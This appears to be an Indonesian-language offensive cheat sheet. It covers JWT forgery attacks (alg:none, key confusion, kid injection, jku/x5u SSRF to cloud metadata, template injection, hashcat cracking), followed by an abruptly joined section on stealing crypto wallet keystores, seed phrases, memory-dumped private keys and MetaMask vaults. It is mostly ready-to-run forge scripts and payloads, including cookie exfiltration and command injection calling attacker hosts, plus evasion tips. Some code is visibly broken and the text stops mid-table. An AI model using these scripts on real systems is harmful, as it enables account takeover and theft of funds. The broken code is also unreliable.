## 1. alg:none

**Dikirim** — header `{"alg":"none","typ":"JWT"}`, signature string kosong.
**Muncul** — server decode tanpa verifikasi.
**Kenapa berhasil** — beberapa implementasi lama/misconfig menerima `none`; PyJWT ≥2.0.0 *menolak* kecuali `algorithms=["none"]` eksplisit. jose4j 0.9.3 menolak default. Lolos di kode custom yang `jwt.decode(token, verify=False)`.

Payload literal (3 varian case):
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJyb290In0.
eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJyb290In0.
eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJyb290In0.
```

Forge:
```bash
python3 - <<'PY'
import base64,json
b=lambda o: base64.urlsafe_b64encode(json.dumps(o,separators=(',',':')).encode()).rstrip(b'=')
for alg in ("none","None","NONE"):
    print(b({"alg":alg,"typ":"JWT"}).decode()+"."+b({"sub":"admin","role":"root"}).decode()+".")
PY
```

---

## 2. HS256 di-sign dengan Public Key (RS/ES → HS)

**Dikirim** — `alg:HS256`, signature = HMAC-SHA256(header.payload, *PEM public key*) termasuk newline.
**Muncul** — server verifikasi `alg` dari header, mengambil kunci verifikasi (public key), lalu memanggil HMAC.
**Kenapa berhasil** — nimbus-jose-jwt < 9.37, jose4j < 0.9.3, python-jose 3.3.0 dengan `jwt.decode(..., algorithms=None)`; PyJWT 2.8.0 menolak karena `algorithms` harus di-set. Kunci harus persis bytes file PEM, **termasuk** `\n` akhir.

Forge:
```bash
openssl genrsa -out k.pem 2048
openssl rsa -in k.pem -pubout -out pub.pem   # attacker lihat ini (mis. /.well-known/jwks->PEM)

python3 - <<'PY'
import base64,json,hmac,hashlib
b=lambda x: base64.urlsafe_b64encode(x).rstrip(b'=')
key=open("pub.pem","rb").read()
h=b(json.dumps({"alg":"HS256","typ":"JWT"},separators=(',',':')).encode())
p=b(json.dumps({"sub":"admin","role":"root"},separators=(',',':')).encode())
sig=hmac.new(key,h+b"."+p,hashlib.sha256).digest()
print(h.decode()+"."+p.decode()+"."+b(sig).decode())
PY
```

---

## 3. kid Path Traversal → signature dari file predictable

**Dikirim** — `{"alg":"HS256","kid":"../../../../dev/null"}`; secret HMAC = isi file (kosong untuk `/dev/null`, atau `/proc/sys/kernel/hostname`, `/etc/hostname`).
**Muncul** — server `open(kid).read()` → kunci.
**Kenapa berhasil** — kode `open(kid,'rb').read()` tanpa sanitasi. Pada `/dev/null` kunci = `b""`.

Payload literal:
```
eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uL2Rldi9udWxsIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJyb290In0.
```
(varian target file: `/dev/null`, `../../../../etc/hostname`, `../../proc/self/environ`)

Forge:
```bash
python3 - <<'PY'
import base64,json,hmac,hashlib
b=lambda x: base64.urlsafe_b64encode(x).rstrip(b'=')
for kid,secret in [("../../../../dev/null",b""),
                   ("../../../../etc/hostname",open("/etc/hostname","rb").read())]:
    h=b(json.dumps({"alg":"HS256","kid":kid,"typ":"JWT"},separators=(',',':')).encode())
    p=b(json.dumps({"sub":"admin"},separators=(',',':')).encode())
    s=b(hmac.new(secret,h+b"."+p,hashlib.sha256).digest())
    print(h.decode()+"."+p.decode()+"."+s.decode())
PY
```

---

## 4. kid SQL Injection

**Dikirim** — `kid:"x' UNION SELECT 'pwned'-- -"` → hasil query mengembalikan `'pwned'` sebagai kunci HMAC.
**Muncul** — server query `SELECT secret FROM keys WHERE kid='<kid>'`.
**Kenapa berhasil** — query string concat. Signature = HMAC dengan `"pwned"`.

Payload literal (URL-encoded untuk header bila dikirim via cookie):
```
{"alg":"HS256","kid":"x' UNION SELECT 'pwned'-- -","typ":"JWT"}
```
Forge:
```bash
python3 - <<'PY'
import base64,json,hmac,hashlib
b=lambda x: base64.urlsafe_b64encode(x).rstrip(b'=')
h=b(json.dumps({"alg":"HS256","kid":"x' UNION SELECT 'pwned'-- -","typ":"JWT"}).encode())
p=b(json.dumps({"sub":"admin","role":"root"}).encode())
print(h.decode()+"."+p.decode()+"."+b(hmac.new(b"pwned",h+b"."+p,hashlib.sha256).digest()).decode())
PY
```

---

## 5. kid Command Injection

**Dikirim** — `kid:"a|curl http://attacker/$(whoami)"` atau `kid:"$(curl http://attacker/)"`.
**Muncul** — server memanggil `subprocess.run(f"openssl dgst -sha256 -hmac {kid}", shell=True)` atau `os.popen(f"cat keys/{kid}")`.
**Kenapa berhasil** — `shell=True`/`os.system`/`Runtime.exec(String)` di Java. Callback out-of-band, bukan untuk forge token langsung—tapi dapat secret dari environment via SSRF ke internal.
Payload:
```
{"alg":"HS256","kid":"a|curl http://10.0.0.1:8080/x?d=$(id|base64 -w0)","typ":"JWT"}
```
Forge (rakit saja, OOB):
```bash
python3 - <<'PY'
import base64,json
b=lambda o: base64.urlsafe_b64encode(json.dumps(o,separators=(',',':')).encode()).rstrip(b'=')
print(b({"alg":"HS256","kid":"a|curl http://10.0.0.1:8080/x?d=$(id|base64)","typ":"JWT"}).decode()+".e30.")
PY
```

---

## 6. kid XSS (stored di dashboard admin)

**Dikirim** — `kid:"<img src=x onerror=fetch('//atk/'+document.cookie)>"`.
**Muncul** — dashboard JWT inspector render `kid` tanpa escaping. Chrome 131 tidak mengeksekusi `onerror` bila ada `Content-Security-Policy` dari nginx 1.25.3 yang ketat; bypass lewat `<svg/onload=>` atau `javascript:` bila CSP longgar.
Payload:
```
{"alg":"HS256","kid":"<svg/onload=fetch(`//atk/${document.cookie}`)>","typ":"JWT"}
```
Forge:
```bash
python3 - <<'PY'
import base64,json
b=lambda o: base64.urlsafe_b64encode(json.dumps(o,separators=(',',':')).encode()).rstrip(b'=')
print(b({"alg":"HS256","kid":"<svg/onload=fetch(`//atk/${document.cookie}`)>","typ":"JWT"}).decode()+".e30.")
PY
```

## 7. jwk Injection (self-signed embedded key)

**Dikirim** — header berisi `jwk` publik attacker (RSA), signature = HMAC? Tidak—pakai RS256 yang di-sign oleh *private* attacker, karena server mengambil `header.jwk` sebagai kunci verifikasi.
**Muncul** — server `jwt.verify(token, token.header.jwk)`.
**Kenapa berhasil** — server mempercayai `jwk` dari header (CVE-2018-1000531 di beberapa lib). PyJWT 2.8.0 tidak otomatis; jose4j 0.9.3 tidak; node-jsonwebtoken 9.0.2 tidak. Umum di kode custom.

Forge:
```bash
openssl genrsa -out att.pem 2048
python3 - <<'PY'
import json,base64,jwt
from cryptography.hazmat.primitives import serialization
priv=open("att.pem","rb").read()
pub=jwt.algorithms.RSAAlgorithm.from_jwk  # placeholder
tok=jwt.encode({"sub":"admin","role":"root"},priv,algorithm="RS256",
               headers={"jwk":json.loads(jwt.algorithms.RSAAlgorithm.to_jwk(
                   serialization.load_pem_private_key(priv,None).public_key()))})
print(tok)
PY
```
Payload header literal (jwk di dalam header — contoh dengan kid kosong):
```
{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","n":"...","e":"AQAB"}}
```

---

## 8. jku SSRF (attacker-hosted JWKS)

**Dikirim** — `jku:"http://attacker/jwks.json"`; server fetch JSON, ambil key attacker, verifikasi token RS256 yang di-sign attacker.
**Muncul** — HTTP GET keluar ke attacker (callback = konfirmasi vetor). Bisa jadi SSRF ke `http://169.254.169.254/latest/meta-data/`.
**Kenapa berhasil** — server fetch `jku` tanpa allowlist host & tanpa HTTPS-only.
Payload:
```
{"alg":"RS256","typ":"JWT","jku":"http://169.254.169.254/latest/meta-data/iam/security-credentials/","kid":"att"}
```
Forge:
```bash
openssl genrsa -out att.pem 2048
openssl rsa -in att.pem -pubout -outform DER -out pub.der 2>/dev/null
python3 - <<'PY'
import json,base64,jwt
from cryptography.hazmat.primitives import serialization
priv=open("att.pem","rb").read()
pub=serialization.load_pem_private_key(priv,None).public_key()
jwk=json.loads(jwt.algorithms.RSAAlgorithm.to_jwk(pub)); jwk["kid"]="att"
open("jwks.json","w").write(json.dumps({"keys":[jwk]}))
print(jwt.encode({"sub":"admin"},priv,algorithm="RS256",
      headers={"jku":"http://10.0.0.1:8080/jwks.json","kid":"att"}))
PY
```

---

## 9. x5u SSRF (X.509 sebagai kunci)

**Dikirim** — `x5u:"http://attacker/cert.pem"`; chain `x5c` boleh kosong, server baca cert PEM dari URL, verifikasi RS256 dengan public key cert tsb.
**Muncul** — GET ke attacker; bila target `http://127.0.0.1:9200/` (Elasticsearch), response parse error → leak path/versi.
**Kenapa berhasil** — sama dengan jku; jose4j `JwtConsumerBuilder().setVerificationKeyResolver(...x5u...)` bila diaktifkan tanpa allowlist.
Payload:
```
{"alg":"RS256","typ":"JWT","x5u":"http://127.0.0.1:9200/","kid":"att"}
```
Forge: sama seperti jku, ganti header `x5u`, host file `cert.pem` (self-signed, di-host attacker). Cert attacker di-generate:
```bash
openssl req -x509 -newkey rsa:2048 -keyout att.pem -out cert.pem -days 1 -nodes -subj "/CN=att"
```

---

## 10. Child Claim Injection (SSTI dari claim)

**Dikirim** — payload `{"sub":"u1","name":"{{7*7}}","email":"${7*7}","role":"{% raw %}..."}`.
**Muncul** — backend merender claim ke template Jinja2/Twig/Freemarker (mis. email notification, PDF generator, log viewer). `{{7*7}}` → `49` adalah indikator; eskalasi `{{cycler.__init__.__globals__.os.popen('id').read()}}` (Jinja2), `${T(java.lang.Runtime).getRuntime().exec('id')}` (SpEL/Freemarker).
**Kenapa berhasil** — claim diperlakukan sebagai trusted *string* lalu di-`render_template_string`. Java Freemarker: `${"freemarker.template.utility.Execute"?new()("id")}`.
Payload:
```
{"sub":"u1","name":"{{7*7}}","x":"${7*7}","y":"<%= 7*7 %>","z":"${T(java.lang.Runtime).getRuntime().exec('id')}"}
```
Forge:
```bash
python3 - <<'PY'
import base64,json
b=lambda o: base64.urlsafe_b64encode(json.dumps(o,separators=(',',':')).encode()).rstrip(b'=')
h=b({"alg":"HS256","typ":"JWT"}); p=b({"sub":"u1","name":"{{7*7}}","z":"${T(java.lang.Runtime).getRuntime().exec('id')}"})
print(h.decode()+"."+p.decode()+".x")
PY
```

---

## 11. KID Parameter Collision (type confusion)

**Dikirim** — `kid` bertipe array `["secret"]` alih-alih string, atau `kid` duplikat di query (`kid=admin&kid=public`).
**Muncul** — server ambil `kid[0]` (dict vs array confusion) atau query DB `WHERE kid=... LIMIT 1` mengambil kunci yang salah (public).
**Kenapa berhasil** — Go `map[string]interface{}` → `fmt.Sprint(kid)` = `[secret]`; Java `get("kid")` cast `(String)` → `ClassCastException` yang di-catch lalu pakai default key. IDOR pada endpoint `/jwks?kid=` dengan parameter pollution.

Payload (kid array — biasanya tidak valid unless parser longgar; fokus pada query param di endpoint):
```
GET /jwks?kid=admin&kid=public HTTP/1.1
Host: target
```
Forge token HS256 dengan kunci yang diperoleh dari collision (mis. `public`):
```bash
python3 - <<'PY'
import base64,json,hmac,hashlib
b=lambda x: base64.urlsafe_b64encode(x).rstrip(b'=')
h=b(json.dumps({"alg":"HS256","kid":"admin","typ":"JWT"}).encode())
p=b(json.dumps({"sub":"admin"}).encode())
print(h.decode()+"."+p.decode()+"."+b(hmac.new(b"public",h+b"."+p,hashlib.sha256).digest()).decode())
PY
```

---

## 12. Weak HMAC Key (secret bocor)

**Dikirim** — token HS256 valid yang di-capture (cookie/localStorage), secret bocor dari `.git/config`, `logs/`, backup `config.yml`, atau `composer.lock` (CVE-2024-* migrasi secret).
**Muncul** — hashcat crack offline, atau langsung generate token baru.
**Kenapa berhasil** — secret pendek/dictionary (`secret`, `changeme`, `jwt-secret`, `your-256-bit-secret`). HS256 = bottleneck hashcat ~2–8 GH/s di RTX 4090.

```bash
# siapkan hash dalam format hashcat (JWT: signature di akhir, file tunggal)
echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.<SIG>' > tok.txt

hashcat -m 16500 -a 0 tok.txt /usr/share/wordlists/rockyou.txt \
  --force -O -w 4 --status --status-timer 10
# -m 16500 = JWT (HS256/HS384/HS512)
```

With rules & mask:
```bash
hashcat -m 16500 -a 0 tok.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule -O
hashcat -m 16500 -a 3 tok.txt '?l?l?l?l?d?d?d?d' -O
hashcat -m 16500 --show tok.txt   # retrieve plaintext

# sekali secret didapat, forge:
python3 -c "import jwt;print(jwt.encode({'sub':'admin','role':'root'},'<SECRET>',algorithm='HS256'))"
```

Katalog secret lemah yang layak diuji lebih dulu:
```
secret, secretkey, secret_key, changeme, changeme123, jwt, jwtsecret,
your-256-bit-secret, your_jwt_secret, supersecret, s3cr3t, admin,
password, P@ssw0rd, HS256, 0000, symfony, laravel, nextauth
```

## JWT Monkey Chain (rantai dari satu vektor ke RCE)

Rantai operasional tipikal: *enum → alg confusion → jku SSRF → cloud IMDS → STS cred → S3/BaaS → eskalasi.*

```
[1] Rekon algoritma & JWKS  : GET /.well-known/jwks.json, /jwks, /.well-known/openid-configuration
[2] Curi/observe token      : cookie, Authorization, localStorage (Chrome 131 DevTools), HAR
[3] Downgrade  alg          : "none" -> header alter -> 200? (bab 1)
[4] Alg confusion RS->HS    : fetch PEM publik -> HMAC (bab 2) -> 200?
[5] kid traversal           : /dev/null, hostname (bab 3)
[6] kid SQLi/CMDi           : OOB callback (bab 4,5)
[7] jku/x5u SSRF            : host jwks.json attacker / IMDS (bab 8,9)
[8] Weak secret via hashcat : -m 16500 pada token captured (bab 12)
[9] Claim SSTI              : {{7*7}} -> spop env (bab 10)
[10] Chain ke cloud         : from jku SSRF -> IMDS -> role cred -> aws s3 ls / gcloud
[11] Persist                : forge refresh token / long-exp admin JWT
```

Skeleton otomasi (fork ringan dari monyet—satu token, semua transformasi):
```bash
TOKEN='eyJ...'
python3 - "$TOKEN" <<'PY'
import sys,base64,json,hmac,hashlib,subprocess,urllib.request
t=sys.argv[1]; h,p,s=t.split(".")
H=json.loads(base64.urlsafe_b64decode(h+"==")); P=json.loads(base64.urlsafe_b64decode(p+"=="))
b=lambda o: base64.urlsafe_b64encode(json.dumps(o,separators=(',',':')).encode()).rstrip(b'=')
def forge(alg,secret): return (b({"alg":alg,"typ":"JWT"}).decode()+"."+b(P).decode()+"."+
                               b(hmac.new(secret,b({"alg":alg,"typ":"JWT"}).and_payload if False else (b({"alg":alg,"typ":"JWT"}).decode()+"."+b(P).decode()).encode(),hashlib.sha256).digest()).decode())
# 1 none
print("none:", b({"alg":"none","typ":"JWT"}).decode()+"."+b(P).decode()+".")
# 2 hs w/ pubkey
for path in ("./pub.pem",):
    try: print("hs:",forge("HS256",open(path,"rb").read()))
    except Exception as e: print("pubkey miss",e)
# 3 kid traversal
print("kid:",forge("HS256",b""))
PY
```

## Jebakan Operasional (kenapa teknik gagal di lapangan)

1. **Whitespace/`=` padding** — PyJWT 2.8.0 toleran `=`, tapi hashicorp/go-jose v4 strik. Signature base64url harus tanpa padding; `binascii.Error: Invalid base64-encoded string` = kirim `=`.
2. **Library default menolak alg** — PyJWT ≥2.0.0 wajib `algorithms=[...]`; jose4j 0.9.3 `setJwsAlgorithmConstraints(Constraint.PRESENT, AlgorithmIdentifiers.NONE)` hanya bila programmer menulisnya. Kalau decode balas `jwt.exceptions.InvalidAlgorithmError`, vektor 1/2 mati—pindah ke 8/9/12.
3. **Kunci HMAC ≠ file PEM utuh** — banyak yang memotong header/footer `-----BEGIN`; hasil mismatch. Harus hex-identik termasuk `\n` akhir. Verifikasi: `cmp <(openssl rsa -in k -pubout) pub.pem`.
4. **jku/x5u diblokir egress** — nginx 1.25.3 di segmen red-team punya `content_by_lua` allowlist atau firewall deny ke 169.254.169.254. Cek jalur `http_proxy` env—banyak lib (requests, node-fetch) menghormati `HTTP_PROXY`, jadi callback masuk lewat proxy egress, bukan attacker.
5. **kid path traversal di Windows 11 24H2** — separator `\` bukan `/`; `..\..\..\..\Windows\win.ini` gagal karena `open()` Python menerima `/`, tapi Java `Paths.get()` di Windows menolak `../` setelah root. Target `/dev/null` tidak ada di Windows → pakai `C:\Windows\System32\drivers\etc\hosts` (bisa dibaca) atau file predictable lain.
6. **hashcat -m 16500 butuh signature base64url**, bukan hex. Jangan decode signature. `Token length exception` = ada newline/quote. Format file harus `header.payload.signature` satu baris tanpa spasi.
7. **hashcat -m 16500 memverifikasi header** — bila header di token uji sudah dimodifikasi (alg diubah), signature lama tidak akan pernah cocok. Pakai token **asli** hasil capture.
8. **alg confusion butuh public key yang identik dengan yang dipakai server** — hanya salinan dari `jwks->PEM` via `openssl pkey -pubin -inform DER` yang cocok. Bila server pakai cert chain (`x5c`), kunci = cert leaf, bukan intermediate.
9. **Claim SSTI di pipeline async** — email notifier Java (Freemarker) jarang sync; payload `{{7*7}}` baru render saat email dibuka, delay menit–jam. Jangan simpulkan gagal setelah 10 detik.
10. **kid XSS tidak dieksekusi di Chrome 131** bila cookie `HttpOnly` dan CSP `script-src 'self'`. Vektor 6 hanya berfungsi di dashboard inspector internal yang secara historis tidak pakai CSP (banyak `jwt.io`-clone).
11. **jwk injection di PyJWT 2.8.0 tidak otomatis** — hanya kode yang memanggil `jwt.decode(token, key=token.header["jwk"])`. Bila target pakai `jwt.PyJWK(...)`, vektor mati.
12. **Monkey chain cepat memicu rate-limit** — nginx 1.25.3 `limit_req` default 1r/s di beberapa deployment; brute kid/jku menghasilkan 429 dan log alert SOC. Turunkan ke 1 req/2s, rotasi `X-Forwarded-For` dari pool CGNAT lab.
13. **Clock skew** — `exp` forged terlalu jauh ke depan (mis. +10 tahun) ditolak klaim `iat`/`nbf` validator dengan leeway default 0. Set `exp=now+3600`, `iat=now-5`, `nbf=now-5` untuk lolos. PyJWT 2.8.0 melempar `ImmatureSignatureError` bila `nbf` > now.
14. **Audience/issuer mismatch** — jangan lupa klaim `aud` dan `iss` dari token asli; forge tanpa `aud` di Auth0 node-jsonwebtoken 9.0.2 → `JsonWebTokenError: jwt audience invalid`.
15. **Rotasi kunci** — JWKS dengan `kid` baru setiap 24 jam (Auth0, AWS Cognito) membuat token forge dari vektor 8/9 kedaluwarsa bila `kid` tidak dicocokkan; selalu ambil `kid` dari JWKS live, bukan contoh.

## 1. Format Keystore (UTC/JSON)

### Struktur file (Ethereum Web3 Secret Storage v3)

```json
{
  "version": 3,
  "id": "b7a4...-uuid",
  "address": "a1b2c3...",
  "crypto": {
    "cipher": "aes-128-ctr",
    "cipherparams": { "iv": "83dbcc02d8ccb40e466191a123791e0e" },
    "ciphertext": "d172bf743a674da9cdad04534d56926e...",
    "kdf": "scrypt",
    "kdfparams": {
      "dklen": 32,
      "salt": "ab0c7876052600dd703518d6fc3fe8984592145b591fc8fb5c6d43190334ba19",
      "n": 262144,
      "r": 1,
      "p": 8
    },
    "mac": "2103ac29920d71da29f15d75b4a16dbe95cfd7ff8faea1056c33131d846e3097"
  }
}
```

| Field | Nilai umum | Catatan |
|---|---|---|
| `version` | `3` | v4 (EIP-2335, BLS) untuk validator |
| `kdf` | `scrypt` / `pbkdf2` | pbkdf2 = `c=262144, prf=hmac-sha256` (kombinasi MyEtherWallet lama) |
| `n` / `r` / `p` | `262144 / 1 / 8` | Geth default `--lightkdf` = `4096/6/1` (jauh lebih cepat di-crack) |
| `cipher` | `aes-128-ctr` | Kunci = `kdf(derived)[0:16]` |
| `mac` | `keccak256(derived[16:32] || ciphertext)` | Verifikasi password |

### Deteksi & triase massal

```bash
# Cari semua keystore di host
find / -type f \( -name "UTC--*" -o -name "*.json" \) 2>/dev/null \
  | xargs -I{} sh -c 'grep -l "\"crypto\"" "{}" 2>/dev/null' | tee /tmp/keystores.txt

# Ambil alamat + params KDF tiap keystore
jq -r '[.address, .crypto.kdf,
  (.crypto.kdfparams.n // .crypto.kdfparams.c // 0 | tostring)] | @tsv' /tmp/keystores.txt
```

### Path default (Linux/macOS/Windows)

| Wallet | Path |
|---|---|
| Geth | `~/.ethereum/keystore/UTC--*` |
| Geth (Win) | `%APPDATA%\Ethereum\keystore\` |
| Besu | `~/.besu/keys/*.json` |
| Nethermind | `~/.nethermind/keystore/` |
| MyEtherWallet (unduh) | `~/Downloads/UTC--*` |
| Parity/OpenEthereum | `~/.local/share/io.parity.ethereum/keys/` |
| Rabby/Rainbow (mobile backup) | `Documents/` atau iCloud Drive |

---

## 2. Seed Phrase — BIP39 / BIP32

### Format & derivasi

- **BIP39**: 12/15/18/21/24 kata, 2048 wordlist, entropy 128–256 bit.
- **Seed**: `PBKDF2-HMAC-SHA512(mnemonic, "mnemonic"+passphrase, 2048 iters, 64 bytes)`.
- **BIP32**: `seed → HMAC-SHA512("Bitcoin seed") → master priv+chaincode`.
- **Path default** Ethereum: `m/44'/60'/0'/0/0` (BIP44). MetaMask mengimpor akun tambahan lewat `m/44'/60'/0'/0/N`.

### Rekonstruksi mnemonic dari device/storage

```bash
# MetaMask legacy vault di Local Storage (Chrome 131 path)
~/.config/google-chrome/Default/Local\ Extension\ Settings/nkbihfbeogaeaoehlefnkodbefgpgknn/
# value = JSON string terenkripsi (lihat §4)

# File backup Ledger (jika ada export via Live)
# Trezor: seed tidak pernah keluar — hanya via recovery seed manual

# Cari frasa plaintext di dump/memory/notepad
grep -rEi '\b(abandon|ability|able|about|above)\b.*\b(zone|zoo)\b' /tmp/dump/ 2>/dev/null
```

### Verifikasi & derivasi seed → alamat

```bash
# Pakai Python (eth-account >= 0.11, mnemonic >= 0.20)
python3 - <<'EOF'
from eth_account import Account
Account.enable_unaudited_hdwallet_features()
for i in range(5):
    acct = Account.from_mnemonic(
        "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about",
        account_path=f"m/44'/60'/0'/0/{i}")
    print(i, acct.address, acct.key.hex())
EOF
```

```bash
# Dengan passphrase BIP39 (25th word)
cast wallet derive-private-key "word1 ... word24" --mnemonic-passphrase "hunter2" -i 0
```

**Kenapa berhasil**: derivasi deterministik — siapa pun dengan mnemonic (+passphrase) merekonstruksi seluruh subtree. **Gagal bila**: mnemonic urutan/typo, wordlist non-English (BIP39 Jepang/Korea), atau passphrase tersimpan terpisah.

### Validasi checksum cepat

```bash
python3 -c "from mnemonic import Mnemonic; print(Mnemonic('english').check('abandon '*11+'about'))"
```

## 3. Private Key dari Memory Dump

### Akuisisi (Windows 11 24H2)

```powershell
# Admin required; Sysinternals v2.53
procdump64.exe -ma -accepteula <PID> C:\dump\wallet.dmp

# atau dari hiberfil/pagefile (forensik offline)
# hiberfil.sys: C:\hiberfil.sys
# pagefile: C:\pagefile.sys (mount dengan WinPmem/Volatility)
```

### Akuisisi (Linux 6.x)

```bash
# /proc/<pid>/mem selama proses hidup
gcore -o /tmp/dump <pid>                    # gdb 14.x
# atau tanpa ptrace: /proc/<pid>/maps + dd
for r in $(cat /proc/$PID/maps | awk '$2 ~ /rw/ {print $1"-"$2}'); do
  s=$(echo $r|cut -d- -f1); e=$(echo $r|cut -d- -f2)
  dd if=/proc/$PID/mem of=/tmp/dump.$s bs=1 skip=$((0x$s)) count=$((0x$e-0x$s)) 2>/dev/null
done
```

### Ekstraksi dari dump

```bash
# CryptoScan (aipelincev/cryptoscan), Rust
cryptoscan -f /tmp/dump/wallet.dmp -o /tmp/found.json --checksum
# output: {"WIF": [...], "HEX": [...], "MNEMONIC": [...], "XPRV": [...]}

# Volatility 3.2 (profil Windows 11 24H2)
vol -f /tmp/dump/wallet.dmp windows.memmap.Memmap --pid <PID> --dump
strings -a /tmp/dump/wallet.dmp | grep -E '^[0-9a-f]{64}$' > /tmp/hexkeys.txt

# Filter: alamat yang di-derive harus cocok dengan keystore/on-chain
python3 - <<'EOF'
from eth_account import Account
import sys
for line in open('/tmp/hexkeys.txt'):
    try:
        a = Account.from_key(line.strip())
        print(a.address, a.key.hex())
    except Exception: pass
EOF
```

### Artefak kunci di memori

| Wallet | Lokasi memori | Umur |
|---|---|---|
| MetaMask (Chrome ext) | content-script isolated world heap | selama tab terbuka |
| Geth `account unlock` | `keyStore` map (Go) | 300s default timeout |
| Electrum (Qt, Python) | heap `keystore` object | sesi |
| Ledger Live (Electron) | Node.js heap, tapi kunci di Secure Element | hanya signature |

**Kenapa gagal**: Windows 11 24H2 HVCI/Credential Guard + PPL melindungi proses browser sebelum Win 11 22H2 (tidak full); modern Electron wallet pakai `safeStorage` → kunci di DPAPI, dump plaintext tidak memuat PK. Antivirus EDR di endpoint membunuh procdump (Microsoft Defender ASR rule `Block credential stealing from lsass`).

---

## 4. Browser Extension Storage

### Chromium (Chrome 131 / Edge 131 / Brave 1.73)

```bash
# Extension ID: MetaMask = nkbihfbeogaeaoehlefnkodbefgpgknn
#               Phantom   = bfnaelmomeimhlpmgjnjophhpkkoljpa
#               Keplr     = dmkamcknogkgcdfhhbddcghachkejeap

# Local Storage LevelDB
~/.config/google-chrome/Default/Local\ Extension\ Settings/nkbihfbeogaeaoehlefnkodbefgpgknn/
# berisi file .log + .ldb; value = JSON string

# IndexedDB (Phantom, Keplr, Rabby)
~/.config/google-chrome/Default/IndexedDB/chrome-extension_<ID>_0.indexeddb.leveldb/

# Session Storage
~/.config/google-chrome/Default/Session\ Storage/
```

### Ekstraksi LevelDB

```bash
# Install: https://github.com/nalgeon/leveldb-cli (atau via pip plyvel)
plyvel_dump ~/.config/google-chrome/Default/Local\ Extension\ Settings/nkbihfbeogaeaoehlefnkodbefgpgknn/

# Alternatif: chromium-storage-dumper (Python)
python3 dump_leveldb.py \
  --path ~/.config/google-chrome/Default/Local\ Extension\ Settings/nkbihfbeogaeaoehlefnkodbefgpgknn/ \
  --key data
```

### Format vault MetaMask v1 (legacy) vs v2

| Versi | Field | Cipher |
|---|---|---|
| v1 "vault" | `data` = base64 JSON | PBKDF2-SHA256, 600k iter, AES-GCM |
| v2 (MetaMask ≥ 10.25) | `vault` object di Local Storage | PBKDF2 600k → AES-GCM, salt acak |

Decrypt dengan password user:

```python
import base64, json
from hashlib import pbkdf2_hmac
from Crypto.Cipher import AES

v = json.loads(open('vault.json').read())      # {"data": "..."} v1
d = json.loads(base64.b64decode(v['data']))
pwd = b'userpassword'
key = pbkdf2_hmac('sha256', pwd, base64.b64decode(d['salt']), d['iterations'], 32)
ct  = base64.b64decode(d['data'])
pt  = AES.new(key, AES.MODE_GCM, nonce=base64.b64decode(d['iv'])).decrypt_and_verify(
        ct, base64.b64decode(d['mac']))
print(json.dumps(json.loads(pt), indent=2))   # → {vault: {mnemonic, accounts...}}
```

### Firefox 134

```bash
~/.mozilla/firefox/<profile>/storage/default/moz-extension+++<UUID>^userContextId=.../idb/
# extension ID di about:debugging
```

**Kenapa gagal**: Chrome 131 mengunci profile saat browser jalan (SQLite `locked`), LevelDB `.ldb` mungkin belum di-flush → ekstrak dari memori atau copy saat browser mati. MetaMask 12.x enkripsi vault dengan password; tanpa wordpair user, kunci turunan tidak ada di disk.

## 5. Cracking

### btcrecover (v0.17.11+, Python 3.8)

```bash
# Keystore Ethereum (butuh ethereum plugin)
python3 btcrecover.py --wallet UTC--2024-...json --passwordlist wordlist.txt
python3 btcrecover.py --wallet keystore.json --passwordlist words.txt \
    --passwordlist-tokenlist "1=config/btcrecover-tokens-meta.json" --threads 8

# Typo/mangling — 1 karakter salah
python3 btcrecover.py --wallet keystore.json --passwordlist words.txt \
    --typos 1 --typos-capslock --typos-swap --typos-repeat

# Seed phrase BIP39 dengan 1 kata lupa (24 kata)
python3 seedrecover.py --wallet-type ethereum --mnemonic "word1 ... word23" \
    --dsw --no-dupchecks --language english
```

### Hashcat 6.2.6

```bash
# Mode 15600 = Ethereum Wallet, PBKDF2-HMAC-SHA256 + AES
# Mode 15700 = Ethereum Wallet, SCRYPT
hashcat -m 15700 keystore.hash wordlist.txt -d 1 -w 3
# keystore.hash = format: $ethereum$s*<n>*<r>*<p>*<salt>*<ciphertext>*<mac>

# Generator hash dari JSON
python3 -c "
import json,base64
j=json.load(open('UTC--...json'))['crypto']
p=j['kdfparams']
print(f\"\$ethereum\$s*{p['n']}*{p['r']}*{p['p']}*{p['salt']}*{j['ciphertext']}*{j['mac']}\")
" > keystore.hash

# BIP39 seed (mode 26600, HMAC-SHA512), mask 12 kata tidak feasible — pakai rules
hashcat -m 26600 seed.hash wordlist.txt -r rules/best64.rule

# Rule + mask hybrid untuk password keystore lemah
hashcat -m 15700 keystore.hash -a 6 wordlist.txt '?d?d?d?d' -O
```

| KDF | Estimasi GPU (RTX 4090) | Catatan |
|---|---|---|
| pbkdf2 `c=1024` | ~500 kH/s | MEW lama, retak cepat |
| pbkdf2 `c=262144` | ~2 kH/s | masih realistis dengan dictionary |
| scrypt `n=4096, r=1, p=8` (Geth `--lightkdf`) | ~40 H/s | target utama |
| scrypt `n=262144, r=1, p=8` | ~1.5 H/s | setara ASIC-resist |
| scrypt `n=262144, r=8, p=1` (standar) | ~0.3 H/s | nyaris tidak praktis |

### Wordlist operasional

```bash
# rockyou2024 (9.9B), hashmob, weakpass_v4
# + mangling rules OneRuleToRuleThemAll
```

**Kenapa berhasil**: user memilih password ≤16 char dari kamus; KDF lemah (`--lightkdf`) atau keystore lama. **Gagal bila**: password >20 char acak, KDF `n=262144,r=8`, atau passphrase BIP39 non-kamus (12 word acak → 2^128 ruang).

## 6. Jebakan Operasional Lapangan

| # | Jebakan | Dampak | Mitigasi |
|---|---|---|---|
| 1 | **Browser masih jalan saat copy profile** | LevelDB `.log` belum ter-flush; IndexedDB `LOCK` — vault tidak lengkap | Force close browser, atau ambil dari `%TEMP%` / memori |
